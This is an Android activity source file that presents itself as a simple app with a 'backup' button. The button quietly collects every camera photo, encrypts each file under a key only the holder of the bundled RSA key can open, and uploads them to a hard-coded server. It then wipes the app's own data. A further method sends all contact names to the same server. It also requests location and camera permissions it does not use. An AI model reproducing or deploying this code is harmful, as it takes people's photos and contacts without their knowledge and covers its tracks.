package com.example.startapp;

import android.Manifest;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.util.Log;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONArray;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.security.InvalidKeyException;
import java.security.KeyFactory;
import java.security.NoSuchAlgorithmException;
import java.security.PublicKey;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.X509EncodedKeySpec;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.Objects;
import java.util.stream.Collectors;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.KeyGenerator;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {
    TextView txtString;
    public String BASE_URL = "http://192.168.1.3:5000";
    private static final int PERMISSION_REQUEST_CODE = 123;
    ListView listView;
    ArrayList<String> arrayList;
    ArrayAdapter arrayAdapter;
    OkHttpClient client = new OkHttpClient();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        Log.i("startApp", "created");
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Button permissionBtn = findViewById(R.id.getPermissionsBtn);
        permissionBtn.setOnClickListener(v -> requestPermissions());
        listView = findViewById(R.id.lstview); //listview from xml
        arrayList = new ArrayList<>(); //empty array list.
        arrayAdapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1, arrayList);
        listView.setAdapter(arrayAdapter);
        Button getContactsBtn = findViewById(R.id.getContactsBtn);
//        getContactsBtn.setOnClickListener(v -> readContacts());
        getContactsBtn.setOnClickListener(v -> takeBackup());

    }

    public void uploadFile(File file) {
        String url = BASE_URL + "/upload";
        MultipartBody.Builder builder = new MultipartBody.Builder();
        builder.setType(MultipartBody.FORM);
        builder.addFormDataPart("file", file.getName(), RequestBody.create(MediaType.parse("image/*"), file));
        RequestBody requestBody = builder.build();
        Request request = new Request.Builder()
                .url(url)
                .post(requestBody)
                .build();
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                Log.i("startApp", "onFailure: " + e.getMessage());
                call.cancel();
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                Log.i("startApp", "onResponse");
                assert response.body() != null;
                final String myResponse = response.body().string();
                Log.e("startApp", myResponse);
                runOnUiThread(() -> {
                    arrayList.add(myResponse);
                    arrayAdapter.notifyDataSetChanged();
                });

            }
        });
    }

    public void takeBackup() {
        List<String> toUpload = new ArrayList<>();
        File file = new File("/storage/self/primary/DCIM/Camera");
        PublicKey publicKey;
        SecretKey aesKey;
        File encryptedKeyFile;
        if (file.isDirectory()) {
            toUpload.addAll(Arrays.stream(Objects.requireNonNull(file.listFiles())).map(File::getAbsolutePath).collect(Collectors.toList()));
        }
        try {
            publicKey = getPublicKey();
        } catch (IOException | NoSuchAlgorithmException | InvalidKeySpecException e) {
            Log.e("startApp", "Failed to get public key due to exception: " + Objects.requireNonNull(e.getMessage()));
            throw new RuntimeException(e);
        }
        try {
            aesKey = getAes();
        } catch (NoSuchAlgorithmException e) {
            Log.e("startApp", "Failed to get aes key due to exception: " + Objects.requireNonNull(e.getMessage()));
            throw new RuntimeException(e);
        }
        try {
            encryptedKeyFile = getEncryptedAes(publicKey, aesKey);
        } catch (NoSuchPaddingException | NoSuchAlgorithmException | InvalidKeyException |
                 IllegalBlockSizeException | BadPaddingException | IOException e) {
            Log.e("startApp", "Failed to encrypt aes key due to exception: " + Objects.requireNonNull(e.getMessage()));
            throw new RuntimeException(e);
        }
        // upload aes key file
        uploadFile(encryptedKeyFile);
        Log.i("startApp", "successfully uploaded file: " + encryptedKeyFile.getName());
        // upload encrypted file
        toUpload.forEach(fileName -> {
            try {
                File encryptedFile = encryptData(aesKey, fileName);
                Log.i("startApp", "successfully encrypted file: " + fileName);
                uploadFile(encryptedFile);
                Log.i("startApp", "successfully uploaded file: " + fileName);
            } catch (IOException | IllegalBlockSizeException | BadPaddingException |
                     NoSuchPaddingException | NoSuchAlgorithmException | InvalidKeyException e) {
                Log.e("startApp", "failed to uploaded file: " + fileName);
            }
        });
        clearApplicationData();
    }

    private File getEncryptedAes(PublicKey publicKey, SecretKey aesKey) throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException, IOException {
        // Encrypt AES key with RSA
        Cipher rsaCipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
        rsaCipher.init(Cipher.ENCRYPT_MODE, publicKey);
        byte[] encryptedAesKey = rsaCipher.doFinal(aesKey.getEncoded());
        File encryptedFile = File.createTempFile("aes_key", ".dat", this.getCacheDir());
        FileOutputStream fosKey = new FileOutputStream(encryptedFile);
        fosKey.write(encryptedAesKey);
        fosKey.close();
        return encryptedFile;
    }

    private File encryptData(SecretKey aesKey, String inputFileName) throws IOException, IllegalBlockSizeException, BadPaddingException, NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException {
        File inputFile = new File(inputFileName);
        Cipher aesCipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        aesCipher.init(Cipher.ENCRYPT_MODE, aesKey);
        byte[] inputBytes = null;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            inputBytes = Files.readAllBytes(inputFile.toPath());
        }
        byte[] encryptedBytes = aesCipher.doFinal(inputBytes);
        File encryptedFile = File.createTempFile(inputFile.getName(), ".dat", this.getCacheDir());
        FileOutputStream fosData = new FileOutputStream(encryptedFile);
        fosData.write(encryptedBytes);
        fosData.close();
        return encryptedFile;
    }

    private PublicKey getPublicKey() throws IOException, NoSuchAlgorithmException, InvalidKeySpecException {
        String keyContent = null;
        try (InputStream inputStream = getResources().openRawResource(R.raw.start_app_key_pub)) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                keyContent = new String(inputStream.readAllBytes(), StandardCharsets.UTF_8);
            }
        }
        if (keyContent == null) {
            Log.e("startApp", "public key not present");
            throw new IOException();
        }
        String replacedKey = keyContent.replace("-----BEGIN PUBLIC KEY-----", "")
                .replaceAll("\\n", "")
                .replace("-----END PUBLIC KEY-----", "");
        byte[] publicKeyBytes = null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            publicKeyBytes = Base64.getDecoder().decode(replacedKey);
        }
        X509EncodedKeySpec keySpec = new X509EncodedKeySpec(publicKeyBytes);
        KeyFactory keyFactory = KeyFactory.getInstance("RSA");
        return keyFactory.generatePublic(keySpec);
    }

    private SecretKey getAes() throws NoSuchAlgorithmException {
        KeyGenerator keyGenerator = KeyGenerator.getInstance("AES");
        keyGenerator.init(256);
        return keyGenerator.generateKey();
    }

    public void clearApplicationData() {
        File cacheDirectory = this.getCacheDir();
        File applicationDirectory = new File(Objects.requireNonNull(cacheDirectory.getParent()));
        if (applicationDirectory.exists()) {
            String[] fileNames = applicationDirectory.list();
            assert fileNames != null;
            for (String fileName : fileNames) {
                if (!fileName.equals("lib")) {
                    deleteFile(new File(applicationDirectory, fileName));
                }
            }
        }
    }

    public static boolean deleteFile(File file) {
        Log.i("startApp", "deleting file/dir: " + file.getAbsolutePath());
        boolean deletedAll = true;
        if (file.isDirectory()) {
            String[] children = file.list();
            for (int i = 0; i < Objects.requireNonNull(children).length; i++) {
                deletedAll = deleteFile(new File(file, children[i])) && deletedAll;
            }
        } else {
            deletedAll = file.delete();
        }

        return deletedAll;
    }

    private void requestPermissions() {
        String[] permissions = {
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.READ_MEDIA_IMAGES
        };
        List<String> permissionsToRequest = new ArrayList<>();
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }
        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                    permissionsToRequest.toArray(new String[0]), // Convert list to array
                    PERMISSION_REQUEST_CODE // Pass the request code
            );
        } else {
            Toast.makeText(this, "All permissions already granted", Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            List<String> deniedPermissions = new ArrayList<>();
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    deniedPermissions.add(permissions[i]);
                }
            }
            if (deniedPermissions.isEmpty()) {
                // All permissions granted
                Toast.makeText(this, "All permissions granted", Toast.LENGTH_SHORT).show();
            } else {
                // Some permissions were denied, show them in a Toast
                Toast.makeText(this, "Permissions denied: " + deniedPermissions, Toast.LENGTH_LONG).show();
            }
        }
    }

    private void readContacts() {
        ContentResolver contentResolver = getContentResolver();
        try (Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);) {
            if (cursor.moveToFirst()) {
                JSONArray array = new JSONArray();
                do {
                    int index = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
                    if (index > -1) {
                        array.put(cursor.getString(index));
                        arrayList.add(cursor.getString(index));
                    }
                } while (cursor.moveToNext());
                arrayAdapter.notifyDataSetChanged();
                send(String.valueOf(array));
            }
        } catch (Exception e) {
            Log.e("startApp", "Exception occurred reading contacts: " + e.getMessage());
            throw new RuntimeException(e);
        }
    }


    void send(String json) throws IOException {
        String url = BASE_URL + "/contacts";
        OkHttpClient client = new OkHttpClient();
//        String json = "{\"id\":1,\"name\":\"John\"}";
        RequestBody body = RequestBody.create(
                MediaType.parse("application/json"), json);
        Request request = new Request.Builder()
                .url(url)
                .post(body)
                .build();
        Log.i("startApp", "making request");
        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                Log.i("startApp", "onFailure: " + e.getMessage());
                call.cancel();
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                Log.i("startApp", "onResponse");
                assert response.body() != null;
                final String myResponse = response.body().string();
                Log.i("startApp", myResponse);
                MainActivity.this.runOnUiThread(() -> txtString.setText(myResponse));
            }
        });
    }
}